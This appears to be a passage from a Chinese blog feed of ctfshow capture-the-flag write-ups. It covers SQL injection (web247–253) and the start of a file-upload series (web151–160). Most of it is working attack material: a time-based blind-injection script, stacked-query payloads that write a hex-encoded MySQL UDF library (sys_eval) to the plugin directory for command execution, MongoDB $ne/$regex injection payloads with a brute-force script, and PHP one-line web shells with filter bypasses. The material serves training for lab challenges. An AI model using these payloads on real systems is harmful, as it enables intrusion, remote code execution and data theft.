class="hljs-subst">&#123;char&#125;</span>&#x27;,sleep(0.1),0)#&quot;</span><br><br>        &#125;<br>        <span class="hljs-keyword">try</span>:<br>            start_time = time.time()<br>            r = requests.get(url=url, params=payload).text<br>            end_time = time.time()<br>            sub = end_time - start_time<br>            <span class="hljs-keyword">if</span> sub &gt;= <span class="hljs-number">0.5</span>:<br>                <span class="hljs-keyword">return</span> char<br>        <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">64</span>):<br>    char = get_flag_char(i)<br>    <span class="hljs-keyword">if</span> char:<br>        flag += char<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;当前情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;已结束&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;最终情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>需要注意的是由于有问号，所以需要加反引号</p><h3 id="0x02-19"><a href="#0x02-19" class="headerlink" title="0x02"></a>0x02</h3><p>报错注入可以看网上wp不多赘叙</p><h2 id="web248"><a href="#web248" class="headerlink" title="web248"></a>web248</h2><p>这方面是知识盲区了，学一下吧</p><p>udf 全称为：user defined function，意为用户自定义函数；用户可以添加自定义的新函数到 Mysql 中，以达到功能的扩充，调用方式与一般系统自带的函数相同，例如 contact()，user()，version()等函数。udf 文件后缀一般为 dll，由 C、C++ 编写。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27;;select version();%23</span><br></code></pre></td></tr></table></figure><p>查看版本，大于5.1版本，继续查 plugin 目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=0<span class="hljs-string">&#x27;;select @@plugin_dir;%23</span><br></code></pre></td></tr></table></figure><p>得到路径为：/usr/lib/mariadb/plugin/</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=0<span class="hljs-string">&#x27;;select &#x27;</span>7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803<span class="hljs-string">&#x27; into dumpfile &#x27;</span>/usr/lib/mariadb/plugin/1.txt<span class="hljs-string">&#x27;%23</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=0<span class="hljs-string">&#x27;;select load_file(&#x27;</span>/usr/lib/mariadb/plugin/1.txt<span class="hljs-string">&#x27;)%23</span><br></code></pre></td></tr></table></figure><p>进行查看，然后导入第二部分</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/api/?<span class="hljs-built_in">id</span>=0<span class="hljs-string">&#x27;;select &#x27;</span>000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e<span class="hljs-string">&#x27; into dumpfile &#x27;</span>/usr/lib/mariadb/plugin/2.txt<span class="hljs-string">&#x27;%23</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=0<span class="hljs-string">&#x27;;select load_file(&#x27;</span>/usr/lib/mariadb/plugin/2.txt<span class="hljs-string">&#x27;)%23</span><br></code></pre></td></tr></table></figure><p>查看第二部分，导入第三部分</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/api/?<span class="hljs-built_in">id</span>=0<span class="hljs-string">&#x27;;select &#x27;</span>332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e816200000000000e8160000000000009800000000000000000000000000000008000000000000000800000000000000b1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000b7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000bc000000010000000000000000000000000000000000000088170000000000009b000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000c500000000000000000000000000000001000000000000000000000000000000<span class="hljs-string">&#x27; into dumpfile &#x27;</span>/usr/lib/mariadb/plugin/3.txt<span class="hljs-string">&#x27;%23</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=0<span class="hljs-string">&#x27;;select load_file(&#x27;</span>/usr/lib/mariadb/plugin/3.txt<span class="hljs-string">&#x27;)%23</span><br></code></pre></td></tr></table></figure><p>查看第三部分</p><p>concat 来将这三部分拼接后导入前面得到的路径：/usr/lib/mariadb/plugin/，然后进行合并</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=0<span class="hljs-string">&#x27;;select unhex(concat(load_file(&#x27;</span>/usr/lib/mariadb/plugin/1.txt<span class="hljs-string">&#x27;),load_file(&#x27;</span>/usr/lib/mariadb/plugin/2.txt<span class="hljs-string">&#x27;),load_file(&#x27;</span>/usr/lib/mariadb/plugin/3.txt<span class="hljs-string">&#x27;))) into dumpfile &#x27;</span>/usr/lib/mariadb/plugin/aaa.so<span class="hljs-string">&#x27;%23</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=0<span class="hljs-string">&#x27;;create function sys_eval returns string soname &#x27;</span>aaa.so<span class="hljs-string">&#x27;%23</span><br></code></pre></td></tr></table></figure><p>最后执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=0<span class="hljs-string">&#x27;;select sys_eval(&#x27;</span><span class="hljs-built_in">ls</span> /<span class="hljs-string">&#x27;)%23</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=0<span class="hljs-string">&#x27;;select sys_eval(&#x27;</span><span class="hljs-built_in">tac</span> /f*<span class="hljs-string">&#x27;)%23</span><br></code></pre></td></tr></table></figure><h2 id="web249"><a href="#web249" class="headerlink" title="web249"></a>web249</h2><p>猜测应该是后端用的intval校验，存在漏洞，所以传一个数组即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>[]=flag<br></code></pre></td></tr></table></figure><h2 id="web250"><a href="#web250" class="headerlink" title="web250"></a>web250</h2><p>MongoDB重言式<br>在mongodb中，要求的查询语句是json格式，如<code>&#123;&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;admin&quot;&#125;</code>，在php中，json就是数组，也就是<code>Array(&#39;username&#39;=&gt; &#39;admin&#39;, &#39;password&#39;=&gt; &#39;admin&#39;)</code>，同时MongoDB要求的json格式中，是可以进行条件查询的，如这样的json: <code>&#123;&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &#123;&quot;$regex&quot;: &#39;^abc$&#39;&#125;&#125;</code>，会匹配密码abc，也就是说，如果键对应的值是一个字符串，那么就相当于条件等于，只不过省去了json，如果键对应的值是json对象，就代表是条件查询<br>payload:<br><code>username[$ne]=1&amp;password[$ne]=1</code></p><p>在api&#x2F;index.php进行post输入</p><h2 id="web251"><a href="#web251" class="headerlink" title="web251"></a>web251</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">username[<span class="hljs-variable">$ne</span>]=admin&amp;password[<span class="hljs-variable">$ne</span>]=1<br></code></pre></td></tr></table></figure><h2 id="web252"><a href="#web252" class="headerlink" title="web252"></a>web252</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">username[<span class="hljs-variable">$ne</span>]=1&amp;password[<span class="hljs-variable">$regex</span>]=^ctfshow&#123;<br></code></pre></td></tr></table></figure><h2 id="web253"><a href="#web253" class="headerlink" title="web253"></a>web253</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&#x27;http://f3b14984-c112-4eca-aa7c-17c5102a1214.challenge.ctf.show//api/&#x27;</span><br>dic = string.digits + string.ascii_lowercase + <span class="hljs-string">&#x27;&#123;&#125;-_&#x27;</span><br>out = <span class="hljs-string">&#x27;ctfshow&#123;&#x27;</span><br><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>, <span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> dic:<br>        payload = &#123;<span class="hljs-string">&#x27;username[$ne]&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;password[$regex]&#x27;</span>: <span class="hljs-string">f&#x27;^<span class="hljs-subst">&#123;out+k&#125;</span>&#x27;</span>&#125;<br>        <span class="hljs-keyword">try</span>:<br>            re = requests.post(url, data=payload)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;\\u767b\\u9646\\u6210\\u529f&quot;</span> <span class="hljs-keyword">in</span> re.text:  <span class="hljs-comment"># 注意反斜杠需要转义</span><br>                out += k<br>                <span class="hljs-built_in">print</span>(out)<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        time.sleep(<span class="hljs-number">0.5</span>)  <span class="hljs-comment"># 添加请求间隔</span><br></code></pre></td></tr></table></figure><hr><p>X1r0z师傅真的神！y4师傅真的神！看师傅的博客学到了很多，看来还是要学学算法的,前前后后一共花了七天的时间，有些劳累了。</p>]]></content>
    
    
    <categories>
      
      <category>每日一题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow文件上传</title>
    <link href="/2024/09/20/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <url>/2024/09/20/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h2><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>测试了一下需要png结尾,传个一句话木马上传之后bp抓包改为php,然后执行就行了，或者蚁剑</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-19174901.png" alt="2024-09-19174901"></p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>前端js进行修改，把对应的png改成php即可</p><h2 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h2><p>参照web151的0x01</p><h2 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h2><p>这题直接改结尾不能成功，尝试htaccess之后发现不行，查阅之后发现前者只适合apache,这里使.user.ini</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini">GIF89a<br><span class="hljs-attr">auto_prepend_file</span>=shell.png<br></code></pre></td></tr></table></figure><p>然后也修改为png,再在bp里进行修改</p><p>然后直接上传一句话的图片就行了</p><p>注意本地使用的是index.php进行连接</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-19200002.png" alt="2024-09-19200002"></p><h2 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h2><p>试了一下，给了报错是</p><p>文件上传失败，失败原因：文件内容不合规，上传的木马过滤了php，稍微修改一下🐎就行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后进行website&#x2F;upload&#x2F;index.php执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmd=system(<span class="hljs-string">&#x27;tac ../f*&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h2><p>和上面web154一致的过程</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-19201438.png" alt="2024-09-19201438"></p><h2 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h2><p>失败原因：文件类型不合规</p><p>在之前的基础上，过滤了<code>[]</code>，可以使用<code>&#123;&#125;</code>进行绕过，其他的流程一致</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>&#123;<span class="hljs-string">&#x27;cmd&#x27;</span>&#125;);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h2><p>这题在之前的基础上对<code>&#123;&#125;</code>,<code>;</code>进行了过滤，根据前面执行的命令，可以直接把要执行的命令传入图片中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;tac ../f*&quot;</span>)<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-19202826.png" alt="2024-09-19202826"></p><h2 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h2><p>和web157做题完全一致</p><h2 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h2><p>本地在之前的基础上禁用了<code>()</code>,正常的函数都不能用了，但是由于php特性</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">``就相当于执行命令<br></code></pre></td></tr></table></figure><p>因此可以这么写木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span>`tac ../f*`<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>剩余的流程和上面一样</p><h2 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h2><p>可以传个png进行简单的fuzz一下，再之前的基础上过滤了空格和反引号，以及log,这样基本不用想执行木马了这里学习一下，又是利用日志包含的原理。log用“.”进行绕过。<strong>当命令执行跟木马上传失败的时候，可以利用日志包含上传</strong></p><p><img 